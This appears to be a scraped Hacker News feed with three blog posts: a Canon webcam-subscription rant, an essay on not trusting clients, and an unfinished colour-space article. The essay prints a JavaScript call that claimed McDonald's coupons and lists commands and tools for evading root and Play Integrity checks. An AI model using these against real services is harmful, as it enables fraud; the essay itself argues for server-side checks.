        <p><a href="https://romanzipp.com/blog/[%7B%22id%22:%22assets::blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-500.png%22,%22title%22:%22canon-500.png%22,%22path%22:%22blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-500.png%22,%22filename%22:%22canon-500%22,%22basename%22:%22canon-500.png%22,%22extension%22:%22png%22,%22is_asset%22:true,%22is_audio%22:false,%22is_previewable%22:false,%22is_image%22:true,%22is_svg%22:false,%22is_video%22:false,%22blueprint%22:%7B%22title%22:%22Asset%22,%22handle%22:%22assets%22%7D,%22edit_url%22:%22https:////romanzipp.com//cp//assets//browse//assets//blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-500.png//edit%22,%22container%22:%7B%22id%22:%22assets%22,%22title%22:%22Assets%22,%22handle%22:%22assets%22,%22disk%22:%22assets%22,%22blueprint%22:%7B%22title%22:%22Asset%22,%22handle%22:%22assets%22%7D,%22search_index%22:null,%22api_url%22:null%7D,%22folder%22:%22blog//no-you-cant-use-you-900-canon-camera-as-a-webcam%22,%22url%22:%22https:////cdn-a.romanzipp.com//blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-500.png%22,%22permalink%22:%22https:////cdn-a.romanzipp.com//blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-500.png%22,%22api_url%22:null,%22size%22:%22220.28%20KB%22,%22size_bytes%22:225571,%22size_kilobytes%22:220.28,%22size_megabytes%22:0.22,%22size_gigabytes%22:0,%22size_b%22:225571,%22size_kb%22:220.28,%22size_mb%22:0.22,%22size_gb%22:0,%22last_modified%22:%222025-01-17T08:04:20.000000Z%22,%22last_modified_timestamp%22:1737101060,%22last_modified_instance%22:%222025-01-17T08:04:20.000000Z%22,%22focus%22:%2250-50-1%22,%22has_focus%22:false,%22focus_css%22:%2250%%2050%%22,%22height%22:538,%22width%22:1411,%22orientation%22:%22landscape%22,%22ratio%22:2.6226765799256504,%22mime_type%22:%22image//png%22,%22duration%22:null,%22duration_seconds%22:null,%22duration_minutes%22:null,%22duration_sec%22:null,%22duration_min%22:null,%22playtime%22:%2208:52%22,%22alt%22:null%7D]" target="_blank">
                <img src="https://romanzipp.com/cdn-cgi/image/width=900px/https://cdn-a.romanzipp.com/blog/no-you-cant-use-you-900-canon-camera-as-a-webcam/canon-500.png" alt="">
            </a>
        </p>

                    <figcaption>Canon.com web page throwing 500 server errors preventing download</figcaption>
            </figure>
                            <h2>$5/mo, $50/yr</h2><p>So I've been really excited when I finally found a downloadable file on the Canon webpage which was not blocked by a faulty newsletter grift and saw the live feed of my camera!</p><p>Well the excitement didn't last long since nearly every single setting is disabled if you're using the software without a paying Canon account.</p>

                            <figure>
        <p><a href="https://romanzipp.com/blog/[%7B%22id%22:%22assets::blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-webcam-utility-2.png%22,%22title%22:%22canon-webcam-utility-2.png%22,%22path%22:%22blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-webcam-utility-2.png%22,%22filename%22:%22canon-webcam-utility-2%22,%22basename%22:%22canon-webcam-utility-2.png%22,%22extension%22:%22png%22,%22is_asset%22:true,%22is_audio%22:false,%22is_previewable%22:false,%22is_image%22:true,%22is_svg%22:false,%22is_video%22:false,%22blueprint%22:%7B%22title%22:%22Asset%22,%22handle%22:%22assets%22%7D,%22edit_url%22:%22https:////romanzipp.com//cp//assets//browse//assets//blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-webcam-utility-2.png//edit%22,%22container%22:%7B%22id%22:%22assets%22,%22title%22:%22Assets%22,%22handle%22:%22assets%22,%22disk%22:%22assets%22,%22blueprint%22:%7B%22title%22:%22Asset%22,%22handle%22:%22assets%22%7D,%22search_index%22:null,%22api_url%22:null%7D,%22folder%22:%22blog//no-you-cant-use-you-900-canon-camera-as-a-webcam%22,%22url%22:%22https:////cdn-a.romanzipp.com//blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-webcam-utility-2.png%22,%22permalink%22:%22https:////cdn-a.romanzipp.com//blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-webcam-utility-2.png%22,%22api_url%22:null,%22size%22:%22211.99%20KB%22,%22size_bytes%22:217074,%22size_kilobytes%22:211.99,%22size_megabytes%22:0.21,%22size_gigabytes%22:0,%22size_b%22:217074,%22size_kb%22:211.99,%22size_mb%22:0.21,%22size_gb%22:0,%22last_modified%22:%222025-01-17T07:45:01.000000Z%22,%22last_modified_timestamp%22:1737099901,%22last_modified_instance%22:%222025-01-17T07:45:01.000000Z%22,%22focus%22:%2250-50-1%22,%22has_focus%22:false,%22focus_css%22:%2250%%2050%%22,%22height%22:1040,%22width%22:1603,%22orientation%22:%22landscape%22,%22ratio%22:1.541346153846154,%22mime_type%22:%22image//png%22,%22duration%22:null,%22duration_seconds%22:null,%22duration_minutes%22:null,%22duration_sec%22:null,%22duration_min%22:null,%22playtime%22:%2208:52%22,%22alt%22:null%7D]" target="_blank">
                <img src="https://romanzipp.com/cdn-cgi/image/width=900px/https://cdn-a.romanzipp.com/blog/no-you-cant-use-you-900-canon-camera-as-a-webcam/canon-webcam-utility-2.png" alt="">
            </a>
        </p>

                    <figcaption>Canon EOS Webcam Utility: Paid features</figcaption>
            </figure>
                            <p>No brightness adjustments, no color correction, only 720p. Even in the paid version there doesn't seem to be a white balance adjustment setting.</p>

                            <figure>
        <p><a href="https://romanzipp.com/blog/[%7B%22id%22:%22assets::blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-webcam-utility-1.png%22,%22title%22:%22canon-webcam-utility-1.png%22,%22path%22:%22blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-webcam-utility-1.png%22,%22filename%22:%22canon-webcam-utility-1%22,%22basename%22:%22canon-webcam-utility-1.png%22,%22extension%22:%22png%22,%22is_asset%22:true,%22is_audio%22:false,%22is_previewable%22:false,%22is_image%22:true,%22is_svg%22:false,%22is_video%22:false,%22blueprint%22:%7B%22title%22:%22Asset%22,%22handle%22:%22assets%22%7D,%22edit_url%22:%22https:////romanzipp.com//cp//assets//browse//assets//blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-webcam-utility-1.png//edit%22,%22container%22:%7B%22id%22:%22assets%22,%22title%22:%22Assets%22,%22handle%22:%22assets%22,%22disk%22:%22assets%22,%22blueprint%22:%7B%22title%22:%22Asset%22,%22handle%22:%22assets%22%7D,%22search_index%22:null,%22api_url%22:null%7D,%22folder%22:%22blog//no-you-cant-use-you-900-canon-camera-as-a-webcam%22,%22url%22:%22https:////cdn-a.romanzipp.com//blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-webcam-utility-1.png%22,%22permalink%22:%22https:////cdn-a.romanzipp.com//blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-webcam-utility-1.png%22,%22api_url%22:null,%22size%22:%22236.82%20KB%22,%22size_bytes%22:242502,%22size_kilobytes%22:236.82,%22size_megabytes%22:0.23,%22size_gigabytes%22:0,%22size_b%22:242502,%22size_kb%22:236.82,%22size_mb%22:0.23,%22size_gb%22:0,%22last_modified%22:%222025-01-17T07:45:00.000000Z%22,%22last_modified_timestamp%22:1737099900,%22last_modified_instance%22:%222025-01-17T07:45:00.000000Z%22,%22focus%22:%2250-50-1%22,%22has_focus%22:false,%22focus_css%22:%2250%%2050%%22,%22height%22:1050,%22width%22:1536,%22orientation%22:%22landscape%22,%22ratio%22:1.4628571428571429,%22mime_type%22:%22image//png%22,%22duration%22:null,%22duration_seconds%22:null,%22duration_minutes%22:null,%22duration_sec%22:null,%22duration_min%22:null,%22playtime%22:%2208:52%22,%22alt%22:null%7D]" target="_blank">
                <img src="https://romanzipp.com/cdn-cgi/image/width=900px/https://cdn-a.romanzipp.com/blog/no-you-cant-use-you-900-canon-camera-as-a-webcam/canon-webcam-utility-1.png" alt="">
            </a>
        </p>

                    <figcaption>Canon EOS Webcam Utility: Paid features</figcaption>
            </figure>
                            <p>Canon will happily take your credit card for you to pay a small monthly price of $4.99 per month or even a discounted $49.99 per year!</p><blockquote><p><em>** The 30-day free trial is valued at $4.99 and can be cancelled at any time during the free trial period through your MyCanon Account Dashboard. After the free trial period, your subscription will automatically be rolled over into the annual or monthly non-refundable, auto-renewable subscription selected upon enrollment in the free trial, which can be cancelled at any time through your MyCanon Account Dashboard. The current available subscription plans are $49.99/year or $4.99/month.</em></p></blockquote><p>In a <a target="_blank" href="https://www.usa.canon.com/content/dam/canon-assets/product-assets/Cameras/camera-misc-pages/ewu/pdf/How%20to%20Subscribe.pdf">support document</a>, Canon lists all differences between the free and paid version. So you can be very gladful, they allow you to even connect the camera.</p>

                            <figure>
        <p><a href="https://romanzipp.com/blog/[%7B%22id%22:%22assets::blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-utility-pro-vs-free-pricing.png%22,%22title%22:%22canon-utility-pro-vs-free-pricing.png%22,%22path%22:%22blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-utility-pro-vs-free-pricing.png%22,%22filename%22:%22canon-utility-pro-vs-free-pricing%22,%22basename%22:%22canon-utility-pro-vs-free-pricing.png%22,%22extension%22:%22png%22,%22is_asset%22:true,%22is_audio%22:false,%22is_previewable%22:false,%22is_image%22:true,%22is_svg%22:false,%22is_video%22:false,%22blueprint%22:%7B%22title%22:%22Asset%22,%22handle%22:%22assets%22%7D,%22edit_url%22:%22https:////romanzipp.com//cp//assets//browse//assets//blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-utility-pro-vs-free-pricing.png//edit%22,%22container%22:%7B%22id%22:%22assets%22,%22title%22:%22Assets%22,%22handle%22:%22assets%22,%22disk%22:%22assets%22,%22blueprint%22:%7B%22title%22:%22Asset%22,%22handle%22:%22assets%22%7D,%22search_index%22:null,%22api_url%22:null%7D,%22folder%22:%22blog//no-you-cant-use-you-900-canon-camera-as-a-webcam%22,%22url%22:%22https:////cdn-a.romanzipp.com//blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-utility-pro-vs-free-pricing.png%22,%22permalink%22:%22https:////cdn-a.romanzipp.com//blog//no-you-cant-use-you-900-canon-camera-as-a-webcam//canon-utility-pro-vs-free-pricing.png%22,%22api_url%22:null,%22size%22:%22112.18%20KB%22,%22size_bytes%22:114876,%22size_kilobytes%22:112.18,%22size_megabytes%22:0.11,%22size_gigabytes%22:0,%22size_b%22:114876,%22size_kb%22:112.18,%22size_mb%22:0.11,%22size_gb%22:0,%22last_modified%22:%222025-01-17T07:31:28.000000Z%22,%22last_modified_timestamp%22:1737099088,%22last_modified_instance%22:%222025-01-17T07:31:28.000000Z%22,%22focus%22:%2250-50-1%22,%22has_focus%22:false,%22focus_css%22:%2250%%2050%%22,%22height%22:636,%22width%22:947,%22orientation%22:%22landscape%22,%22ratio%22:1.4889937106918238,%22mime_type%22:%22image//png%22,%22duration%22:null,%22duration_seconds%22:null,%22duration_minutes%22:null,%22duration_sec%22:null,%22duration_min%22:null,%22playtime%22:%2208:52%22,%22alt%22:null%7D]" target="_blank">
                <img src="https://romanzipp.com/cdn-cgi/image/width=900px/https://cdn-a.romanzipp.com/blog/no-you-cant-use-you-900-canon-camera-as-a-webcam/canon-utility-pro-vs-free-pricing.png" alt="">
            </a>
        </p>

                    <figcaption>Canon documentation "How to Subscribe"</figcaption>
            </figure>
                            <p>Software development isn’t free, and I’m happy to pay for software I use regularly. However, Canon is a hardware company, not a software company, and they should—due to the lack of standards—provide software that allows you to use their cameras as intended. Aside from development costs, there’s no justification for a subscription model, particularly from a company earning nearly <a target="_blank" href="https://global.canon/en/ir/finance/highlight.html">$3 billion in profit</a>.</p><h2>Why</h2><p>So Canon will not allow you, to use <strong><u>your own</u></strong> camera on <strong><u>your own</u></strong> computer with <strong><u>your own</u></strong> cables the way you intent to without paying for another subscription.</p><p>Canon, what the fuck?</p>

                            <hr>

<h2>
    Read more...
</h2>


                            

                    
        
    </div>
</article>
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Trusting clients is probably a security flaw (154 pts)]]></title>
            <link>https://liberda.nl/weblog/trust-no-client/</link>
            <guid>42734956</guid>
            <pubDate>Fri, 17 Jan 2025 07:27:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://liberda.nl/weblog/trust-no-client/">https://liberda.nl/weblog/trust-no-client/</a>, See on <a href="https://news.ycombinator.com/item?id=42734956">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody"><p>I looked at a discussion on blink-dev Google Group and saw <a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/Ux5h_kGO22g/m/0BJlM-HpAAAJ">the message</a>:</p><blockquote><p>Perhaps it is a good thing for user choice to have a browser that is fully open to any use and allows anonymous user actions.</p><p>The result of such open-ness is that an entire series of services that need to trust the client (used in the oauth sense of the word) are not available to web apps. […]</p><p>I have recently worked on a fork of Chromium that is designed to have this functionality and on Native Wallet apps to get it. The lack of this functionality in Chrome will drive developers away from Chrome and fragment the user experience. We already have the problem of directing users away from Chrome to a secure wallet and being unable to bring the original user session back to Chrome. Of course Google and Apple get to solve this problem with their own wallets, but that will not fly in Europe and now the US DHS is asking for solutions that are more open as well.</p></blockquote><p>My understanding of security started an internal screaming.</p><h2 id="meet-the-mcdonald-s-app">Meet the McDonald's app</h2><p>Hold on, I'm not at all joking. The McDonald's app developers put a lot of effort into policing the clients allowed to even dream about running the app. The app was checking for:</p><ul><li>whether you have a directory called <code>TWRP</code> in your internal storage. TWRP is a custom recovery, and by default, stores device backups you generate from recovery in there. You have a device backup? Then no deals for you, nerd.</li><li>whether you have the <code>com.topjohnwu.magisk</code> app installed. <em>You like modifying your devices, don't you?</em> Pay full price, nerd.</li><li>whether you have installed the app from <code>com.android.vending</code>, more widely known as Google Play. What, you don't have it? That'll be €14,50, nerd.</li><li>check your device with RootBeer, a library that tries to check whether you have root access. Not passing? Card or cash, nerd?</li><li>and finally, using the SafetyNet API (now being rebranded into Play Integrity, specifically the Device Integrity and App Integrity parts, with some minor changes). Not passing? Pay. Nerd.</li></ul><p>This is more annoying than any financial app I've had, and I have 5 of them on my phone. mBank.pl uses Play Integrity API, but that's to use contactless payments via BLIK, and the rest of the app works. IKO, the app of PKO BP, seeing that I have root access, disabled logging in with biometry, requiring me to log in with a PIN code. bunq told me that maybe my device should not be rooted. The worst one seems to be Revolut, which blocked my access, clearly stating the reason to be root access.</p><p>The McDonald's app only displays a generic error message, and an error code that tells you nothing.</p><h2 id="and-what-are-guarding-so-much">And what are guarding so much?</h2><p>What are the <em>Deals</em> inside the app? Currently, I can get a free burger for 650 points, that is, if I spend 65 Euro in McDonald's first. What a deal. But that's not what brings me here.</p><p>There once was a <a href="https://www.pepper.pl/promocje/mcdonald-i-coca-cola-50-lat-528907">promotion</a> in collaboration between Coca-Cola and McDonald's, specifically available in Poland. It boiled down to this:</p><ol><li>Buy 3 bottles of Coca-Cola.</li><li>Enter 3 codes (from each bottle) into the Coca-Cola app.</li><li>Enter the code you got from the Coca-Cola app into the McDonald's app.</li><li>In return, you get a free meal with a Big Mac.</li></ol><p>Ignore this unnecessary duplication with copying the code between 2 apps. Actually, ignore the Coca-Cola part as a whole. So, what happens in the McDonald's app? As with many things in that app, this deal was operated by a page opened in a WebView. The config for the country was set to point to the deal's page from the main screen. On the page, there was a pretty simple form:</p><figure data-portrait="1"><picture><source srcset="https://cdn-swa.lnl.gay/pio/OmG22yyBIuD5uuVa3jHTE/3RqSrIQrZ9gfB1NuwoX8B.webp 140w, https://cdn-swa.lnl.gay/pio/OmG22yyBIuD5uuVa3jHTE/_n47tO8nFfonJDd8bfd0R.webp 240w, https://cdn-swa.lnl.gay/pio/OmG22yyBIuD5uuVa3jHTE/rLNpcJb2W3zzJoMkfb85K.webp 360w, https://cdn-swa.lnl.gay/pio/OmG22yyBIuD5uuVa3jHTE/p89BUFFh3gfd2bfU7wTV3.webp 413w" type="image/webp"><img alt="Screenshot of application interface, in Polish, with a text input and a confirm button, asking to enter a voucher code from Coca-Cola." srcset="https://cdn-swa.lnl.gay/pio/OmG22yyBIuD5uuVa3jHTE/fUYB4psNrQQ6ZyiojYSR_.jpeg 140w, https://cdn-swa.lnl.gay/pio/OmG22yyBIuD5uuVa3jHTE/xow_z0kC9Qm543bTOADRk.jpeg 240w, https://cdn-swa.lnl.gay/pio/OmG22yyBIuD5uuVa3jHTE/fiycr2ZqUwowQxEtVeLcc.jpeg 360w, https://cdn-swa.lnl.gay/pio/OmG22yyBIuD5uuVa3jHTE/HPRZNnpg05BbFaexX4VyI.jpeg 413w" title="Screenshot of application interface, in Polish, with a text input and a confirm button, asking to enter a voucher code from Coca-Cola." src="https://cdn-swa.lnl.gay/pio/OmG22yyBIuD5uuVa3jHTE/HPRZNnpg05BbFaexX4VyI.jpeg" type="image/jpeg"></picture></figure><h2 id="obscurity-is-not-security">Obscurity is not security</h2><p>From now on, this is basically a post mortem, except it's not McDonald's writing it.</p><p>The page opened in the WebView was sending the entered code in a request to a McDonald's server. But here's the flaw: the request checking and invalidating the code, was doing just that. It just returned whether the code is valid. The page was requesting a check whether the code was valid, and <strong><em>the client</em> was assigning the coupon to the user.</strong></p><p><em>It turns out that the company's servers do not verify this and take the app "for its word"</em>, <a href="https://android.com.pl/news/484772-darmowe-big-mac-w-mcdonalds-haker/">reported android.com.pl</a>.</p><p>When you say you need to check whether the request is coming from a "trustworthy client", I say <strong>trust no client, use a rubber.</strong></p><h3 id="an-untouched-device-can-exploit-your-service-too">An untouched device can exploit your service, too</h3><p>Oh, right, I said earlier about some measures? This whole exploit could (at least at that time) be <strong>executed from an unmodified device</strong>. Open the app, go to privacy policy (opens in a WebView), find an external link. Be creative. Find a link to Google's privacy policy, and tap their logo to go to Google Search. Find a link to YouTube, and search for a video with a link somewhere else. Whatever gets you to a <strong>page that can execute a little bit of JavaScript for you</strong>.</p><pre data-lang="js"><code data-lang="js"><span>COLA</span><span>.</span><span>offerActivation</span><span>.</span><span>send</span><span>({
</span><span>  loyaltyId</span><span>: </span><span>2424</span><span>,
</span><span>  rewardId</span><span>: </span><span>95275</span><span>,
</span><span>})
</span></code></pre><p>This was the thing.</p><p>But don't worry. If this is fixed, nothing is lost. You remember the measures I talked about? They indeed check signs that might indicate you're not trustworthy. But really, passing these checks might just mean you know how these checks work. What can and does go wrong?</p><h3 id="you-can-just-comply-with-the-checks">You can just comply with the checks.</h3><p>TWRP backups? Change the directory name.</p><p>Magisk Manager app? Change the package name in the settings.</p><p>Not installed from Google Play? Open terminal and run <code>pm set-installer com.mcdonalds.mobileapp com.android.vending</code>. Or install with <code>pm install -i com.android.vending [file]</code>. Or the same with <code>adb</code>.</p><p>Root checks? Add McDonald's to Zygisk Denylist.</p><h3 id="you-can-just-not-run-the-checks">You can just not run the checks.</h3><p>Oh, that was just the way where we obediently fulfil these checks. But <strong>if this runs on your device, you are the one in control of it.</strong> You can inject into the process with tools like Zygisk or LSPosed, and remove these checks. <em>I have injected into 2137 processes on my phone today. Nobody controls this.</em></p><h3 id="you-can-just-tell-the-checks-what-they-want-to-hear">You can just tell the checks what they want to hear.</h3><p>And the last check. SafetyNet/Play Integrity. Check whether you pass with <a href="https://play.google.com/store/apps/details?id=com.henrikherzig.playintegritychecker">SPIC</a>. If you don't pass basic SafetyNet, install <a href="https://github.com/Magisk-Modules-Repo/MagiskHidePropsConf">MagiskHide Props Config</a>, run <code>props</code> in console, change signature to something from the available list. Now, if you don't pass CTS SafetyNet, install <a href="https://github.com/kdrag0n/safetynet-fix">Universal SafetyNet Fix</a>. Yes, my phone really just passes SafetyNet and Play Integrity like this (Integrity up to <code>MEETS_DEVICE_INTEGRITY</code>, without <code>MEETS_STRONG_INTEGRITY</code>).</p><blockquote><p>No labels (a blank value): The app is running on a device that has signs of attack (such as API hooking) or system compromise (such as being rooted), or the app is not running on a physical device (such as an emulator that does not pass Google Play integrity checks).</p></blockquote><p>This is a fragment of <a href="https://developer.android.com/google/play/integrity/verdict#device-integrity-field">the Play Integrity documentation</a>. But the problem with checking if the user is a god, is that the user is a god. They can just tell you what you want to hear.</p><p>(On a side note, if you speak Polish, I recommend reading <a href="https://informatykzakladowy.pl/aplikacja-mobilna-nie-wie-czy-telefon-jest-zhackowany/">"Aplikacja mobilna nie wie, czy telefon jest zhackowany" from Informatyk Zakładowy</a>)</p><h3 id="but-typical-users-will-not-study-your-app-if-it-doesn-t-work">But typical users will not study your app if it doesn't work</h3><p>Mass exploitation was, in the end, stopped by ending the deal, because of how out of control it was. So who <em>was</em> stopped?</p><ul><li><p>Unaware users. Every time you introduce a stupid check, there is a user with a false positive result. For example, <a href="https://github.com/scottyab/rootbeer/issues/147">some of the RootBeer checks will trigger</a> on some unmodified Xiaomi, Asus, or Fairphone, or random cheap phones that happened to be in someone's nearest Tesco. The biggest irony is that some of these users will <em>root their phones</em> to bypass these checks instead.</p> <p>If your app starts looking for the <code>MEETS_STRONG_INTEGRITY</code> label from Play Integrity, even more users will be affected like this.</p> <p>Literally look at the Google Play reviews of the McDonald's app. This app has a 2,8/5 rating and you have to keep scrolling them to find positive ones, from the very few users who managed to get the app running.</p></li><li><p>Users with root access to their own phones. First of all, why? What's bad about having administrator access to <em>your own phone</em>?</p> <p>Second, this is ineffective if they know how to workaround. They can inject into your process and tell you <em>it's a good phone ma'am</em>.</p></li><li><p>Huawei users. Or Amazon Fire users. Or any Android device made for China market users. Or users of a mobile Linux distribution, trying to run an app over Waydroid. Their devices by default do not have Google Play Services that can be tricked like this, and will require more work than I described to pass these checks.</p></li></ul><h3 id="but-will-it-at-least-stop-fraud">But will it at least stop fraud?</h3><p>Hell no.</p><figure><picture><source srcset="https://cdn-swa.lnl.gay/pio/iaymp2BM1Og5yrcNJaRO8/xwVLyn2y8PvioLjcD4gl-.webp 140w, https://cdn-swa.lnl.gay/pio/iaymp2BM1Og5yrcNJaRO8/9WfXXwSEK5CNVWDJj67aQ.webp 240w, https://cdn-swa.lnl.gay/pio/iaymp2BM1Og5yrcNJaRO8/6mNz7r7vKlVuhih2LgAO8.webp 360w, https://cdn-swa.lnl.gay/pio/iaymp2BM1Og5yrcNJaRO8/GXl5mX9JzGEvTanOx6aYs.webp 480w, https://cdn-swa.lnl.gay/pio/iaymp2BM1Og5yrcNJaRO8/fpLk-kbtYjOcR7WGGl9e6.webp 720w, https://cdn-swa.lnl.gay/pio/iaymp2BM1Og5yrcNJaRO8/gpJvZADE5oY4VtHa4jlCA.webp 1080w, https://cdn-swa.lnl.gay/pio/iaymp2BM1Og5yrcNJaRO8/na1gd-txrqQTeDzrUwrc5.webp 1230w" type="image/webp"><img alt="A photo from a bot farm with lots of phones pinned to a wall, with USB cables connected to them." srcset="https://cdn-swa.lnl.gay/pio/iaymp2BM1Og5yrcNJaRO8/qcPBmZJtDUlnTbGLSm9el.jpeg 140w, https://cdn-swa.lnl.gay/pio/iaymp2BM1Og5yrcNJaRO8/WQoxPmlWvLpyixF5Va6mq.jpeg 240w, https://cdn-swa.lnl.gay/pio/iaymp2BM1Og5yrcNJaRO8/2WavYG5WrH55VzeD8Xkf9.jpeg 360w, https://cdn-swa.lnl.gay/pio/iaymp2BM1Og5yrcNJaRO8/um2yV5dvbd4CjUjS0ZkQz.jpeg 480w, https://cdn-swa.lnl.gay/pio/iaymp2BM1Og5yrcNJaRO8/ezoBGTj_uTnxd8cY0c-p0.jpeg 720w, https://cdn-swa.lnl.gay/pio/iaymp2BM1Og5yrcNJaRO8/YzZJxswi73wwNEZIcVJd-.jpeg 1080w, https://cdn-swa.lnl.gay/pio/iaymp2BM1Og5yrcNJaRO8/z32i06c_tsgoulDK3ZPpe.jpeg 1230w" title="A photo from a bot farm with lots of phones pinned to a wall, with USB cables connected to them." src="https://cdn-swa.lnl.gay/pio/iaymp2BM1Og5yrcNJaRO8/z32i06c_tsgoulDK3ZPpe.jpeg" type="image/jpeg"></picture></figure></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Issues with Color Spaces and Perceptual Brightness (112 pts)]]></title>
            <link>https://johnaustin.io/articles/2025/issues-with-cielab-and-perceptual-brightness</link>
            <guid>42734851</guid>
            <pubDate>Fri, 17 Jan 2025 07:01:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://johnaustin.io/articles/2025/issues-with-cielab-and-perceptual-brightness">https://johnaustin.io/articles/2025/issues-with-cielab-and-perceptual-brightness</a>, See on <a href="https://news.ycombinator.com/item?id=42734851">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-nc-base="header" data-controller="AncillaryLayout">
            

            <main>
              
                <section data-content-field="main-content">
                  <article id="post-6785e53e87fad21239890f26" data-item-id="6785e53e87fad21239890f26">

    
      
    

    <div data-layout-label="Post Body" data-type="item" data-updated-on="1736828221920" id="item-6785e53e87fad21239890f26"><div data-block-type="2" id="block-3740d9de0eef22b96189">
  <p>Unlike RGB, the <a href="https://en.wikipedia.org/wiki/CIELAB_color_space" target="_blank">CIELab</a> color space<a href="#margin" target="_blank">And the more modern variants like CIECAM02 and Oklab.</a> is designed to be perceptually uniform. This is a broad goal, which roughly means that we would like changes in the numbers to match same changes that we observe when performing various studies of human perception. </p><p>It’s a bit less 'math’ and more ‘modeling’. We try to fit equations to the observed data with the lowest error possible, across many different axis. It’s helpful to imagine adding the word ‘predicted’ in front of all of the CIELAB terminology (ie. Predicted Perceptual Lightness), because it’s just trying to predict human test results! </p><p>This process means that there is some error. For example, ideally, a color with L=50 looks twice as bright as a color with L=25.  Except, with very strongly saturated colors like red, this isn’t actually the case in any of these color spaces.</p><p>This is what’s called the <a href="https://en.wikipedia.org/wiki/Helmholtz%E2%80%93Kohlrausch_effect">Helmholtz-Kohlrausch effect</a>. Take a look at the below panel of colors. Most humans agree that the red is quite a bit brighter than the others in the row, and yet they all have the exact same lightness value when calculated with something like CIELAB!</p>
</div><div data-test="image-block-inline-outer-wrapper" data-aspect-ratio="41.590909090909086" data-block-type="5" id="block-yui_3_17_2_1_1736829225871_2131">

      

      
        <figure>
          
        
        

        
          
            
          <div data-animation-role="image">
            <p><img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/eaf70676-eb13-4d48-b0b1-7051995f3027/Helmholtz-Kohlrausch_effect_visualized_improved.png" data-image="https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/eaf70676-eb13-4d48-b0b1-7051995f3027/Helmholtz-Kohlrausch_effect_visualized_improved.png" data-image-dimensions="440x181" data-image-focal-point="0.5,0.5" alt="" data-load="false" elementtiming="system-image-block" src="https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/eaf70676-eb13-4d48-b0b1-7051995f3027/Helmholtz-Kohlrausch_effect_visualized_improved.png" width="440" height="181" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/eaf70676-eb13-4d48-b0b1-7051995f3027/Helmholtz-Kohlrausch_effect_visualized_improved.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/eaf70676-eb13-4d48-b0b1-7051995f3027/Helmholtz-Kohlrausch_effect_visualized_improved.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/eaf70676-eb13-4d48-b0b1-7051995f3027/Helmholtz-Kohlrausch_effect_visualized_improved.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/eaf70676-eb13-4d48-b0b1-7051995f3027/Helmholtz-Kohlrausch_effect_visualized_improved.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/eaf70676-eb13-4d48-b0b1-7051995f3027/Helmholtz-Kohlrausch_effect_visualized_improved.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/eaf70676-eb13-4d48-b0b1-7051995f3027/Helmholtz-Kohlrausch_effect_visualized_improved.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5b1340bcee17595af30b6b97/eaf70676-eb13-4d48-b0b1-7051995f3027/Helmholtz-Kohlrausch_effect_visualized_improved.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs">

            </p>
          </div>
        
          
        

        
          
          <figcaption>
            <p>A set of colors demonstrating the Helmholtz-Kohlrausch effect. The red appears more vivid to the human eye.</p>
          </figcaption>
        
      
        </figure>
      

    </div><div data-block-type="2" id="block-yui_3_17_2_1_1736829225871_2454">
  <p>There is some recent <a href="https://onlinelibrary.wiley.com/doi/10.1002/col.22839" target="_blank">research</a> I found that models this effect and applies an additional transform to account for it, building off of work from <a href="https://onlinelibrary.wiley.com/doi/abs/10.1002/col.5080160608" target="_blank">Fairchild MD, Pirrotta E</a> in the 90’s. The end result is labeled as the “Predicted Equivalent Achromatic Lightness”, or in other words “The lightness of the gray that most closely matches the perceived lightness”. </p><p>This is actually quite a useful value, because it’s precisely the value we want when desaturating an image! Most desaturation operations spit out a [0..1] value which is then (later) rendered as an RGB gray color. Using the L_EAL value instead jumps us right to the end, giving the exact perceptual gray color to place in the resulting desaturated image.</p><p>How much of an issue is this? Well, I noticed. I’ve been writing a tool to desaturate game screenshots, to help us evaluate relative brightnesses between art assets, and improve overall game readability. All of the red assets appeared.. strangely dark in the desaturated images, even when using CIELAB!</p>
</div><div><div data-test="image-block-inline-outer-wrapper" data-block-type="5" id="block-yui_3_17_2_1_1736829225871_28689">

      

      
        <figure>
          
        
        

        
          
            
          <div data-animation-role="image">
